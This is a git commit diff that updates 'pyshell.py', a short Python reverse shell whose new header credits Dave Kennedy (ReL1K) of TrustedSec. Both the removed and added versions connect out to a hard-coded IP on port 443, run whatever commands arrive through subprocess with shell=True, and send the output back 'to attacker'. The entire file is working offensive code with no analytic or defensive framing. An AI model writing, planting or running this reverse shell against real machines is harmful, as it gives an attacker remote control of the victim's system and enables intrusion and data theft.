4a22f7b2ece4ba49beaa95c646755b136f5a6c18
740i <740i@users.noreply.github.com>
2016-08-06 19:27:00 -0700

    Update pyshell.py

--- pyshell.py
+++ pyshell.py
@@ -1,24 +1,27 @@
 #!/usr/bin/python
-# imports here
-import socket,subprocess
-HOST = '172.16.32.137'    # The remote host
+# Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
+# Copyright 2012 TrustedSec, LLC. All rights reserved. 
+#
+# This piece of software code is licensed under the FreeBSD license..
+#
+# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
+
+import socket
+import subprocess
+
+HOST = '192.168.225.136'    # The remote host
 PORT = 443            # The same port as used by the server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# connect to attacker machine
 s.connect((HOST, PORT))
-# send we are connected
-s.send('[*] Connection Established!')
-# start loop
+# loop forever
 while 1:
-     # recieve shell command
-     data = s.recv(1024)
-     # if its quit, then break out and close socket
-     if data == "quit": break
-     # do shell command
-     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-     # read output
-     stdout_value = proc.stdout.read() + proc.stderr.read()
-     # send output to attacker
-     s.send(stdout_value)
-# close socket
+    # recv command line param
+    data = s.recv(1024)
+    # execute command line
+    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    # grab output from commandline
+    stdout_value = proc.stdout.read() + proc.stderr.read()
+    # send back to attacker
+    s.send(stdout_value)
+# quit out afterwards and kill socket
 s.close()
